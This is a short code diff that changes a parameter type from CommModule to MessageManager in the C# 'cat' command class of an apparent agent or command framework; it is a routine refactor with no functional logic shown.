@@ -11,7 +11,7 @@ namespace Agent.Commands
     public class CatCommand : AgentCommand
     {
         public override string Name => "cat";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             string path;
             if (task.SplittedArgs.Length != 1)
